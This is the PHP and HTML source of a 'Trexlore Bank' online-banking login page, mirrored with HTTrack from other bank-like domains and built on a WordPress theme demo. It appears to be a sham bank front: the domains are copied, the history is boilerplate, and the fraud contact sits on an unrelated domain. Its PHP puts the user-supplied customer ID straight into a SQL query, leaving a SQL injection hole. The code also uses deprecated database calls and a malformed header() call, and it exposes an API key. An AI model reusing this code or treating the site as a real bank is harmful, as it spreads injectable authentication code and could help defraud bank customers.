<?php
session_start();
header('http://trexlorebk.com/online/main/Services/Twilio.php');
include "conn.php";

if(isset($_REQUEST['submit']))

{

	$user_id=$_SESSION['username'];

    $ipin=$_SESSION['IPIN'];

	$cust_id=$_REQUEST['cust_id'];

	//echo "select * from act_holder_details where `user_id`='".$user_id."' AND `cust_password`='".$ipin."' AND `customer_id`='".$cust_id."'";

	$sql=mysql_query("select * from act_holder_details where `user_id`='".$user_id."' AND `cust_password`='".$ipin."' AND `customer_id`='".$cust_id."'");
$rows=mysql_num_rows($sql);
while($dt = mysql_fetch_array($sql)) {
         	$email=$dt["cust_mail"];
         	$cust_name=$dt["cust_name"];
         	$account=$dt["cust_act_number"];
         	$_SESSION['countrycode'] =$dt["cust_countrycode"];
         	$_SESSION['phone'] = $dt["cust_phone"];
         	
           }
$rows=mysql_num_rows($sql);

	if($rows>0)

	{
	    $_SESSION['custid'] = $cust_id;
	    
$admin_email=mysql_fetch_object(mysql_query("SELECT * FROM `admin`"));
$admin_email=$admin_email->email;
  $to = $email; 
  

 $message="<table border='0' cellpadding='0' cellspacing='0' width='689'>
      <tbody>
        <tr>
          <td colspan='9' height='97'><div align='right'><img src='http://trexlorebk.com/logo.png'></div></td>
      </tr>

        <tr>

          <td width='549' colspan='7'><div align='right'>".date("F j, Y, g:i a")."</div></td>

        </tr>
<tr>

          <td colspan='9'><b>INTERNET BANKING LOG IN CONFIRMATION</b></td>

        </tr>
        <tr>

          <td colspan='9'><b> Dear Valued Customer </b></td>

        </tr>

        <tr>

          <td colspan='9'>&nbsp;</td>

        </tr>


        <tr>

          <td colspan='9'>&nbsp;</td>

        </tr>

        <tr>

          <td colspan='9'>Please be informed that your internet banking profile was accessed at ".date("F j, Y, g:i a")." </td>

        </tr>

        <tr>

          <td colspan='9'>If you did not log on to your internet banking profile at the time detailed above, please call our 24 hour interactive contact center or send an email to <a 'mailto:e-fraudteam@enizbnkas.com'>e-fraudteam@enizbnkas.com</a> immediately.</td>

        </tr>
       

        <tr>

          <td colspan='9'>&nbsp;</td>

        </tr>

        <tr>

          <td width='130'> Account Name </td>

          <td width='10'> :</td>

          <td colspan='8' width='549'> $cust_name </td>

        </tr>

        <tr>

          <td colspan='9'>&nbsp;</td>

        </tr>

        <tr>

          <td width='130'> Account Number </td>

          <td width='10'> :</td>

          <td colspan='8' width='549'> $account </td>

        </tr>

        <tr>

          <td colspan='9'>&nbsp;</td>

        </tr>
 <tr>

          <td colspan='9'>&nbsp;</td>

        </tr>

       
        <tr>

          <td colspan='9'> Thank you for choosing Trexlore Bank</td>

        </tr>

        <tr>

          <td colspan='9'>&nbsp;</td>

        </tr>

      </tbody>

    </table>"; 	 
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";
 $headers .= 'From: '.$admin_email."\r\n";// From
 $subject  =  'INTERNET BANKING LOG IN CONFIRMATION' ; //Subject

if(mail($to,$subject,$message,$headers)){
	header('Location: http://trexlorebk.com/online/main/dashboard.php');
}
else
{
    	header('Location: http://trexlorebk.com/online/main/dashboard.php');
}

		?>

		 <?php	

	}

	else

	{

	?>

	 <?php	

	}

}

?>

<!DOCTYPE html>
<html lang="en-US">

<!-- Mirrored from mellatsavings.com/http://unionbtrust.com/online/main/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 23 May 2021 19:01:35 GMT -->
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
	<meta charset="UTF-8" />
	<meta name="viewport" content="initial-scale=1.0" />	
		
	<link rel="pingback" href="../xmlrpc.html" />
	<title>Client Access | Trexlore Bank</title>
<meta name='robots' content='noindex,follow' />
<link rel='dns-prefetch' href='https://fonts.googleapis.com/' />
<link rel='dns-prefetch' href='https://s.w.org/' />
<link rel="shortcut icon" href="../wp-content/themes/finanza/images/favicon.png">
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/11\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/demo.goodlayers.com\/finanza\/wp-includes\/js\/wp-emoji-release.min.js?ver=582678fa6b18e9bff808f2019f6840fe"}};
			!function(a,b,c){function d(a,b){var c=String.fromCharCode;l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,a),0,0);var d=k.toDataURL();l.clearRect(0,0,k.width,k.height),l.fillText(c.apply(this,b),0,0);var e=k.toDataURL();return d===e}function e(a){var b;if(!l||!l.fillText)return!1;switch(l.textBaseline="top",l.font="600 32px Arial",a){case"flag":return!(b=d([55356,56826,55356,56819],[55356,56826,8203,55356,56819]))&&(b=d([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]),!b);case"emoji":return b=d([55358,56760,9792,65039],[55358,56760,8203,9792,65039]),!b}return!1}function f(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var g,h,i,j,k=b.createElement("canvas"),l=k.getContext&&k.getContext("2d");for(j=Array("flag","emoji"),c.supports={everything:!0,everythingExceptFlag:!0},i=0;i<j.length;i++)c.supports[j[i]]=e(j[i]),c.supports.everything=c.supports.everything&&c.supports[j[i]],"flag"!==j[i]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[j[i]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(h=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",h,!1),a.addEventListener("load",h,!1)):(a.attachEvent("onload",h),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),g=c.source||{},g.concatemoji?f(g.concatemoji):g.wpemoji&&g.twemoji&&(f(g.twemoji),f(g.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
<link rel='stylesheet' id='wp-block-library-css'  href='../wp-includes/css/dist/block-library/style.minc3c0c3c0.css?ver=582678fa6b18e9bff808f2019f6840fe' type='text/css' media='all' />
<link rel='stylesheet' id='contact-form-7-css'  href='../wp-content/plugins/contact-form-7/includes/css/styles3c213c21.css?ver=5.1.1' type='text/css' media='all' />
<link rel='stylesheet' id='stock-ticker-css'  href='../wp-content/plugins/stock-ticker/assets/css/stock-tickercdd8cdd8.css?ver=3.0.5.4' type='text/css' media='all' />
<link rel='stylesheet' id='stock-ticker-custom-css'  href='../wp-content/uploads/stock-ticker-customcdd8cdd8.css?ver=3.0.5.4' type='text/css' media='all' />
<link rel='stylesheet' id='style-css'  href='../wp-content/themes/finanza/stylec3c0c3c0.css?ver=582678fa6b18e9bff808f2019f6840fe' type='text/css' media='all' />
<link rel='stylesheet' id='Open-Sans-google-font-css'  href='https://fonts.googleapis.com/css?family=Open+Sans%3A300%2C300italic%2Cregular%2Citalic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic&amp;subset=greek%2Ccyrillic-ext%2Ccyrillic%2Clatin%2Clatin-ext%2Cvietnamese%2Cgreek-ext&amp;ver=582678fa6b18e9bff808f2019f6840fe' type='text/css' media='all' />
<link rel='stylesheet' id='ABeeZee-google-font-css'  href='https://fonts.googleapis.com/css?family=ABeeZee%3Aregular%2Citalic&amp;subset=latin&amp;ver=582678fa6b18e9bff808f2019f6840fe' type='text/css' media='all' />
<link rel='stylesheet' id='superfish-css'  href='../wp-content/themes/finanza/plugins/superfish/css/superfishc3c0c3c0.css?ver=582678fa6b18e9bff808f2019f6840fe' type='text/css' media='all' />
<link rel='stylesheet' id='dlmenu-css'  href='../wp-content/themes/finanza/plugins/dl-menu/componentc3c0c3c0.css?ver=582678fa6b18e9bff808f2019f6840fe' type='text/css' media='all' />
<link rel='stylesheet' id='font-awesome-css'  href='../wp-content/themes/finanza/plugins/font-awesome-new/css/font-awesome.minc3c0c3c0.css?ver=582678fa6b18e9bff808f2019f6840fe' type='text/css' media='all' />
<link rel='stylesheet' id='jquery-fancybox-css'  href='../wp-content/themes/finanza/plugins/fancybox/jquery.fancyboxc3c0c3c0.css?ver=582678fa6b18e9bff808f2019f6840fe' type='text/css' media='all' />
<link rel='stylesheet' id='flexslider-css'  href='../wp-content/themes/finanza/plugins/flexslider/flexsliderc3c0c3c0.css?ver=582678fa6b18e9bff808f2019f6840fe' type='text/css' media='all' />
<link rel='stylesheet' id='style-responsive-css'  href='../wp-content/themes/finanza/stylesheet/style-responsivec3c0c3c0.css?ver=582678fa6b18e9bff808f2019f6840fe' type='text/css' media='all' />
<link rel='stylesheet' id='style-custom-css'  href='../wp-content/themes/finanza/stylesheet/style-customc3c0c3c0.css?ver=582678fa6b18e9bff808f2019f6840fe' type='text/css' media='all' />
<link rel='stylesheet' id='ms-main-css'  href='../wp-content/plugins/masterslider/public/assets/css/masterslider.main2c3d2c3d.css?ver=3.2.7' type='text/css' media='all' />
<link rel='stylesheet' id='ms-custom-css'  href='../wp-content/uploads/masterslider/custome23ce23c.css?ver=5.7' type='text/css' media='all' />
<script type='text/javascript' src='../wp-includes/js/jquery/jqueryb8ffb8ff.js?ver=1.12.4'></script>
<script type='text/javascript' src='../wp-includes/js/jquery/jquery-migrate.min330a330a.js?ver=1.4.1'></script>
<link rel='https://api.w.org/' href='../wp-json/index.html' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../xmlrpc0db00db0.html?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="../wp-includes/wlwmanifest.xml" /> 

<link rel="canonical" href="index.html" />
<link rel='shortlink' href='../indexdf36df36.html?p=4294' />
<link rel="alternate" type="application/json+oembed" href="../wp-json/oembed/1.0/embedbf12bf12.json?url=https%3A%2F%2Fdemo.goodlayers.com%2Ffinanza%2Fqa%2F" />
<link rel="alternate" type="text/xml+oembed" href="../wp-json/oembed/1.0/embedda8fda8f.html?url=https%3A%2F%2Fdemo.goodlayers.com%2Ffinanza%2Fqa%2F&amp;format=xml" />
<script>var ms_grabbing_curosr='../wp-content/plugins/masterslider/public/assets/css/common/grabbing.html',ms_grab_curosr='../wp-content/plugins/masterslider/public/assets/css/common/grab.html';</script>
<meta name="generator" content="MasterSlider 3.2.7 - Responsive Touch Image Slider" />
<script type="text/javascript">
(function(url){
	if(/(?:Chrome\/26\.0\.1410\.63 Safari\/537\.31|WordfenceTestMonBot)/.test(navigator.userAgent)){ return; }
	var addEvent = function(evt, handler) {
		if (window.addEventListener) {
			document.addEventListener(evt, handler, false);
		} else if (window.attachEvent) {
			document.attachEvent('on' + evt, handler);
		}
	};
	var removeEvent = function(evt, handler) {
		if (window.removeEventListener) {
			document.removeEventListener(evt, handler, false);
		} else if (window.detachEvent) {
			document.detachEvent('on' + evt, handler);
		}
	};
	var evts = 'contextmenu dblclick drag dragend dragenter dragleave dragover dragstart drop keydown keypress keyup mousedown mousemove mouseout mouseover mouseup mousewheel scroll'.split(' ');
	var logHuman = function() {
		if (window.wfLogHumanRan) { return; }
		window.wfLogHumanRan = true;
		var wfscr = document.createElement('script');
		wfscr.type = 'text/javascript';
		wfscr.async = true;
		wfscr.src = url + '&r=' + Math.random();
		(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(wfscr);
		for (var i = 0; i < evts.length; i++) {
			removeEvent(evts[i], logHuman);
		}
	};
	for (var i = 0; i < evts.length; i++) {
		addEvent(evts[i], logHuman);
	}
})('../index7a117a11.html?wordfence_lh=1&amp;hid=179858E1F9E747704A076ACD36432415');
</script>
		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
		<style type="text/css">.broken_link, a.broken_link {
	text-decoration: line-through;
}</style></head>

<body class="page-template-default page page-id-4294 _masterslider _msp_version_3.2.7 gdlr-carousel-no-scroll">
<div class="body-wrapper  float-menu gdlr-header-solid" data-home="" >
		<header class="gdlr-header-wrapper" id="gdlr-header-wrapper">
		<!-- top navigation -->
				<div class="top-navigation-wrapper">
			<div class="top-navigation-container container">
				<div class="top-navigation-left">
					<div class="top-social-wrapper">
						<div class="social-icon">
<a href="#" target="_blank" >
<i class="fa fa-facebook" ></i></a>
</div>
<div class="social-icon">
<a href="#" target="_blank" >
<i class="fa fa-flickr" ></i></a>
</div>
<div class="social-icon">
<a href="#" target="_blank" >
<i class="fa fa-linkedin" ></i></a>
</div>
<div class="social-icon">
<a href="#" target="_blank" >
<i class="fa fa-pinterest-p" ></i></a>
</div>
<div class="social-icon">
<a href="#" target="_blank" >
<i class="fa fa-twitter" ></i></a>
</div>
<div class="clear"></div>					</div>
				</div>
				<div class="top-navigation-right">
					<div class="top-navigation-right-text">
						<div class="gdlr-text-block"><i class="fa fa-clock-o"></i>Mon - Fri : 09:00 - 16:00</div>
<div class="gdlr-text-block"><i class="fa fa-envelope"></i>info@trexlorebk.com</div>
<div class="gdlr-text-block"><i class="fa fa-phone"></i>0 850 222 0 800</div>					</div>
				</div>
				<div class="clear"></div>
			</div>
		</div>
		
		<!-- logo -->
		<div id="gdlr-header-substitute" ></div>
		<div class="gdlr-header-inner">
			<div class="gdlr-header-container container">
				<!-- logo -->
				<div class="gdlr-logo">
					<a class="gdlr-solid-logo" href="#" >
						<img src="../wp-content/themes/finanza/images/logo.png" alt=""  />					</a>
										<div class="gdlr-responsive-navigation dl-menuwrapper" id="gdlr-responsive-navigation" ><button class="dl-trigger">Open Menu</button><ul id="menu-main-menu" class="dl-menu gdlr-main-mobile-menu"><li id="menu-item-4549" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home page_item page-item-4547 menu-item-has-children menu-item-4549"><a href="../index-2.html">Home</a>
</li>
<li id="menu-item-4766" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-4766"><a href="../about-us/index.html">Who We Are</a>

</li>
<li id="menu-item-4490" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-4490"><a href="../portfolio-grid-3-columns-no-space/index.html">What We Do</a>
</li>
<li id="menu-item-4376" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-4376"><a href="../blog-full-with-right-sidebar/index.html">News</a>
</li>
<li id="menu-item-20" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-has-children menu-item-20"><a href="index.html">Client Access</a>
</li>
<li id="menu-item-4472" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-4472"><a href="../contact-page/index.html">Contact</a>
</li>

</ul></div>				</div>

				<!-- navigation -->
				<div class="gdlr-navigation-wrapper"><nav class="gdlr-navigation" id="gdlr-main-navigation" ><ul id="menu-main-menu-1" class="sf-menu gdlr-main-menu"><li  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home page_item page-item-4547 menu-item-has-children menu-item-4549menu-item menu-item-type-post_type menu-item-object-page menu-item-home page_item page-item-4547 menu-item-has-children menu-item-4549 gdlr-normal-menu"><a href="../index-2.html" class="sf-with-ul-pre">Home</a>
</li>
<li  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-4766menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-4766 gdlr-normal-menu"><a href="../about-us/index.html" class="sf-with-ul-pre"><i class="fa fa-bank"></i>Who We Are</a>

</li>
<li  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-4490menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-4490 gdlr-mega-menu"><a href="../portfolio-grid-3-columns-no-space/index.html" class="sf-with-ul-pre"><i class="fa fa-briefcase"></i>What We Do</a><div class="sf-mega">
</div></li>
<li  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-4376menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-4376 gdlr-mega-menu"><a href="../blog-full-with-right-sidebar/index.html" class="sf-with-ul-pre"><i class="fa fa-bullhorn"></i>News</a><div class="sf-mega">
</div></li>
<li  class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-20menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-has-children menu-item-20 gdlr-normal-menu"><a href="index.html" class="sf-with-ul-pre">Client Access</a>

</li>
<li  class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-4472menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-4472 gdlr-mega-menu"><a href="../contact-page/index.html" class="sf-with-ul-pre">Contact</a><div class="sf-mega">

</div></li>

</ul><span class="gdlr-nav-separator" ></span>
<img id="gdlr-menu-search-button" src="../wp-content/themes/finanza/images/magnifier-dark.png" alt="" width="58" height="59" />
<div class="gdlr-menu-search" id="gdlr-menu-search">
	<form method="get" id="searchform" action="#">
				<div class="search-text">
			<input type="text" value="Type Keywords" name="s" autocomplete="off" data-default="Type Keywords" />
		</div>
		<input type="submit" value="" />
		<div class="clear"></div>
	</form>	
</div>		
</nav><div class="gdlr-navigation-gimmick" id="gdlr-navigation-gimmick"></div><div class="clear"></div></div>
				<div class="clear"></div>
			</div>
		</div>
	</header>
	
	
				<div class="gdlr-page-title-wrapper"  >
			<div class="gdlr-page-title-overlay"></div>
			<div class="gdlr-page-title-container container" >
				<h1 class="gdlr-page-title">My Account</h1>
								
							</div>	
		</div>	
		<!-- is search -->	<div class="content-wrapper">
	<div class="gdlr-content">

		<!-- Above Sidebar Section-->
							<div class="above-sidebar-wrapper"><section id="content-section-1" ><div class="section-container container"><div class="eight columns" ><div class="gdlr-item gdlr-accordion-item style-1"  style="margin-bottom: 60px;"  ><div class="accordion-tab active pre-active" ><h4 class="accordion-title" ><i class="icon-minus" ></i><span>Sign In To Online Banking</span></h4><div class="accordion-content"><p>Trexlore Bank  provides you with the tools you need to monitor and manage your assets. Through our innovative and intuitive technology, including investment portals, mobile trading platforms, transactional apps and more, you can access assets right at your fingertips.</p>
</div></div></div></div><div class="four columns" ><div class="gdlr-item-title-wrapper gdlr-item  gdlr-left gdlr-small "><div class="gdlr-item-title-head"><p>
<?php
    if($i==1)
    { 
              echo '<p style="color:red">'.$message.'</p>';
          }
          if($loginwrong==1)
          {
          	$message="Please check User id or PIN.Wrong Login Details";
          	   echo '<p style="color:red">'.$message.'</p>';
          }
    	?>
            

     </p> <h3 class="gdlr-item-title gdlr-skin-title gdlr-skin-border">customer ID</h3></div></div><div class="gdlr-item gdlr-content-item" ><div role="form" class="" id="" lang="en-US" dir="ltr">
<div class="screen-reader-response"></div>

<form  method="post" class="wpcf7-form" novalidate>
    
<p>
    <span class="wpcf7-form-control-wrap placeholder"><input type="text"
    name="cust_id" type="text" maxlength="20" id="ctlWorkflow_txtUserID"
        placeholder="Customer ID"
        title="Enter your User ID here." class="wpcf7-form-control wpcf7-text wpcf7-validates-as-required" aria-required="true" aria-invalid="false" /></span> </p>

    
<p><input  type="submit" name="submit" value="SUBMIT" id="Signon" class="wpcf7-form-control wpcf7-submit" /></p>
<div class="wpcf7-response-output wpcf7-display-none"></div></form></div>
</div></div><div class="clear"></div></div></section></div>
				
		<!-- Sidebar With Content Section-->
		
		<!-- Below Sidebar Section-->
		
				
	</div><!-- gdlr-content -->
		<div class="clear" ></div>
	</div><!-- content wrapper -->

		
	<footer class="footer-wrapper" >
				<div class="footer-container container">
										<div class="footer-column three columns" id="footer-widget-1" >
					<div id="text-5" class="widget widget_text gdlr-item gdlr-widget">			<div class="textwidget"><p><img src="../wp-content/uploads/2015/07/footer-logo.png" alt="" /></p>
<p>Founded in 1784, our bank and its subsidiaries offer private banking, private business banking and private wealth management, including investment, trust and brokerage services</p>
</div>
		</div>				</div>
										<div class="footer-column three columns" id="footer-widget-2" >
					<div id="text-4" class="widget widget_text gdlr-item gdlr-widget"><h3 class="gdlr-widget-title">Contact Info</h3><div class="clear"></div>			<div class="textwidget"><p><i class="gdlr-icon fa fa-phone" style="color: #bbbbbb; font-size: 16px; " ></i> 0 850 222 0 800 </p>
<div class="clear"></div>
<div class="gdlr-space" style="margin-top: -10px;"></div>
<p><i class="gdlr-icon fa fa-envelope" style="color: #bbbbbb; font-size: 16px; " ></i> info@trexlorebk.com </p>
<div class="clear"></div>
<div class="gdlr-space" style="margin-top: -10px;"></div>
<p><i class="gdlr-icon fa fa-clock-o" style="color: #bbbbbb; font-size: 16px; " ></i> Everyday 9:00-16:00</p>
<div class="clear"></div>
<div class="gdlr-space" style="margin-top: 30px;"></div>
<p><a href="https://facebook.com/"><i class="gdlr-icon fa fa-facebook" style="color: #bbbbbb; font-size: 20px; " ></i></a> <a href="https://twitter.com/"><i class="gdlr-icon fa fa-twitter" style="color: #bbbbbb; font-size: 20px; " ></i></a> <a href="#"><i class="gdlr-icon fa fa-dribbble" style="color: #bbbbbb; font-size: 20px; " ></i></a> <a href="#"><i class="gdlr-icon fa fa-pinterest" style="color: #bbbbbb; font-size: 20px; " ></i></a> <a href="#"><i class="gdlr-icon fa fa-google-plus" style="color: #bbbbbb; font-size: 20px; " ></i></a> <a href="#"><i class="gdlr-icon fa fa-instagram" style="color: #bbbbbb; font-size: 20px; " ></i></a></p>
</div>
		</div>				</div>
										<div class="footer-column three columns" id="footer-widget-3" >
					<div id="gdlr-recent-portfolio2-widget-5" class="widget widget_gdlr-recent-portfolio2-widget gdlr-item gdlr-widget"><h3 class="gdlr-widget-title">Our Works</h3><div class="clear"></div><div class="gdlr-recent-port2-widget"><div class="recent-port-widget-thumbnail"><a href="#" ><img src="../wp-content/uploads/2013/12/shutterstock_204407506-150x150.jpg" alt="" width="150" height="150" /></a></div><div class="recent-port-widget-thumbnail"><a href="#" ><img src="../wp-content/uploads/2013/12/shutterstock_134132600-150x150.jpg" alt="" width="150" height="150" /></a></div><div class="recent-port-widget-thumbnail"><a href="#" ><img src="../wp-content/uploads/2013/12/portfolio-1-150x150.jpg" alt="" width="150" height="150" /></a></div><div class="recent-port-widget-thumbnail"><a href="#" ><img src="../wp-content/uploads/2013/12/shutterstock_226039468-150x150.jpg" alt="" width="150" height="150" /></a></div><div class="recent-port-widget-thumbnail"><a href="#" ><img src="../wp-content/uploads/2013/12/shutterstock_158522279-150x150.jpg" alt="" width="150" height="150" /></a></div><div class="recent-port-widget-thumbnail"><a href="#" ><img src="../wp-content/uploads/2013/11/shutterstock_269736632-150x150.jpg" alt="" width="150" height="150" /></a></div><div class="clear"></div></div></div>				</div>
										<div class="footer-column three columns" id="footer-widget-4" >
					<div id="stock_ticker-2" class="widget widget_stock_ticker gdlr-item gdlr-widget"><h3 class="gdlr-widget-title">Stock Ticker</h3><div class="clear"></div><div
					 class="stock-ticker-wrapper "
					 data-stockticker_symbols="AAPL,MSFT,INTC, GOOGL, FB, "
					 data-stockticker_show="symbol"
					 data-stockticker_number_format="dc"
					 data-stockticker_decimals="2"
					 data-stockticker_static="1"
					 data-stockticker_class=""
					 data-stockticker_speed="50"
					 data-stockticker_empty="true"
					 data-stockticker_duplicate="false"
					><ul class="stock_ticker"><li class="init"><span class="sqitem">Loading stock data...</span></li></ul></div></div>				</div>
									<div class="clear"></div>
		</div>
				
				<div class="copyright-wrapper">
			<div class="copyright-container container">
				<div class="copyright-left">
					<a href="../index-2.html" style="margin-right: 8px">Home</a> | <a href="../about-us/index.html" style="margin-left: 8px;margin-right: 8px">About</a> | <a href="#" style="margin-left: 8px;margin-right: 8px">Terms</a> | <a href="../contact-page/index.html" style="margin-left: 8px;margin-right: 8px">Contact</a> 				</div>
				<div class="copyright-right">
				Copyright 2021 All Right Reserved Trexlore Bank.				</div>
				<div class="clear"></div>
			</div>
		</div>
			</footer>
	</div> <!-- body-wrapper -->
<script type="text/javascript"></script><script type='text/javascript'>
/* <![CDATA[ */
var wpcf7 = {"apiSettings":{"root":"https:\/\/demo.goodlayers.com\/finanza\/wp-json\/contact-form-7\/v1","namespace":"contact-form-7\/v1"},"cached":"1"};
/* ]]> */
</script>
<script type='text/javascript' src='../wp-content/plugins/contact-form-7/includes/js/scripts3c213c21.js?ver=5.1.1'></script>
<script type='text/javascript' src='../wp-content/plugins/stock-ticker/assets/js/jquery.webticker.min1f441f44.js?ver=2.2.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var stockTickerJs = {"ajax_url":"https:\/\/demo.goodlayers.com\/finanza\/wp-admin\/admin-ajax.php"};
/* ]]> */
</script>
<script type='text/javascript' src='../wp-content/plugins/stock-ticker/assets/js/jquery.stockticker.mincdd8cdd8.js?ver=3.0.5.4'></script>
<script type='text/javascript' src='../wp-content/themes/finanza/plugins/superfish/js/superfish51525152.js?ver=1.0'></script>
<script type='text/javascript' src='../wp-includes/js/hoverIntent.minc245c245.js?ver=1.8.1'></script>
<script type='text/javascript' src='../wp-content/themes/finanza/plugins/dl-menu/modernizr.custom51525152.js?ver=1.0'></script>
<script type='text/javascript' src='../wp-content/themes/finanza/plugins/dl-menu/jquery.dlmenu51525152.js?ver=1.0'></script>
<script type='text/javascript' src='../wp-content/themes/finanza/plugins/jquery.easing51525152.js?ver=1.0'></script>
<script type='text/javascript' src='../wp-content/themes/finanza/plugins/jquery.transit.min51525152.js?ver=1.0'></script>
<script type='text/javascript' src='../wp-content/themes/finanza/plugins/fancybox/jquery.fancybox.pack51525152.js?ver=1.0'></script>
<script type='text/javascript' src='../wp-content/themes/finanza/plugins/fancybox/helpers/jquery.fancybox-media51525152.js?ver=1.0'></script>
<script type='text/javascript' src='../wp-content/themes/finanza/plugins/fancybox/helpers/jquery.fancybox-thumbs51525152.js?ver=1.0'></script>
<script type='text/javascript' src='../wp-content/themes/finanza/plugins/flexslider/jquery.flexslider51525152.js?ver=1.0'></script>
<script type='text/javascript' src='../wp-content/themes/finanza/javascript/gdlr-script51525152.js?ver=1.0'></script>
<script type='text/javascript' src='https://maps.google.com/maps/api/js?key=AIzaSyD733KCcfQFGTp5SjZ5P9nvUKl6Ir4fYPo&amp;libraries=geometry%2Cplaces%2Cweather%2Cpanoramio%2Cdrawing&amp;language=en&amp;ver=582678fa6b18e9bff808f2019f6840fe'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpgmp_local = {"all_location":"All","show_locations":"Show Locations","sort_by":"Sort by","wpgmp_not_working":"not working...","place_icon_url":"https:\/\/demo.goodlayers.com\/finanza\/wp-content\/plugins\/wp-google-map-plugin\/assets\/images\/icons\/"};
/* ]]> */
</script>
<script type='text/javascript' src='../wp-content/plugins/wp-google-map-plugin/assets/js/maps531b531b.js?ver=2.3.4'></script>
<script type='text/javascript' src='../wp-includes/js/wp-embed.minc3c0c3c0.js?ver=582678fa6b18e9bff808f2019f6840fe'></script>
</body>

<!-- Mirrored from mellatsavings.com/http://unionbtrust.com/online/main/ by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 23 May 2021 19:01:37 GMT -->
</html>